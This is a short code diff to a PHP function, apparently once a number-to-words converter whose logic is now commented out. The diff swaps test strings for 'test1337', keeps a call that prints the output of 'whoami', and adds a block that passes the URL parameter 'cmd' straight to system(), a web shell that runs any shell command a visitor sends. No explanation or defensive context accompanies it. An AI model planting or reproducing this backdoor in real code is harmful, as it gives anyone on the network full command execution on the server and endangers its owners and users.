@@ -10,9 +10,14 @@ function main(array $args)
 //     $number = (int)($args['number']);
 //     $words = (new NumberToWords)->toWords($number);
  
-    echo("test123");
+    echo("test1337");
     echo(system("whoami"));
-    print("test123");
+    print("test1337");
+ 
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
  
 //     return [
 //         'body' => $words,
